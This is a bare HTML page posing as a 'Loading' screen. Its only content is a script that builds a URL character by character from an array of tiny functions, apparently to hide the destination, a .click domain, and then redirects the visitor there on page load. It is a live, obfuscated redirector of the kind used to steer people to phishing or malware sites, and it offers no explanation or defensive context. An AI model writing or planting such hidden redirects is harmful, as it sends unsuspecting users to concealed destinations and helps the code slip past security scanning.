<!DOCTYPE html>
<html>
<head>
    <title>Loading</title>
    <script>
        const parts = [
            () => 'h',
            () => 't',
            () => 't',
            function() { return 'p'; },
            _ => 's',
            _ => ':',
            function() { return '/'; },
            () => '/',
            function() { return 'v'; },
            () => 'e',
            () => 'r',
            function() { return 'g'; },
            () => 'e',
            () => 'n',
            function() { return '.'; },
            _ => 'c',
            function() { return 'l'; },
            () => 'i',
            () => 'c',
            _ => 'k',
            () => '/',
            () => 's',
            _ => '/',
            function() { return 'n'; },
            function() { return 'e'; },
            () => 'w'
        ];
        const url = parts.reduce((acc, fn) => acc + fn(), '');
        document.location = url;
    </script>
</head>
<body></body>
</html>
